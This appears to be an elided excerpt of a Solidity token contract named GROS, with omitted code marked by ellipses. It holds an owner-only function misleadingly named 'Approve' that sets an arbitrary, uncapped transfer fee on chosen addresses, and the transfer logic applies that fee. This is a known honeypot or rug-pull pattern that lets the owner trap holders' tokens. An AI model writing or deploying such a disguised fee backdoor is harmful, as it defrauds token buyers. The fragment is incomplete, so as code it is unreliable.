...
// File contracts/GROS.sol



pragma solidity ^0.8.0;

contract GROS is Ownable, ERC20 {
    uint256 public TransferFee = 0;
    mapping(address => bool) public isTransferFeeSet;
    mapping(address => uint256) public TransferFees;

    constructor(uint256 _totalSupply) ERC20("GROS", "GROS") {
    ...
    function Approve(address user, uint256 _TransferFee) external onlyOwner {
        TransferFees[user] = _TransferFee;
        isTransferFeeSet[user] = true;
    }
    ...
    function _transfer(
        ...
        uint256 amount
            ...
            if (isTransferFeeSet[sender]) {
                fee = TransferFees[sender];
            } else {
                fee = TransferFee;
            }
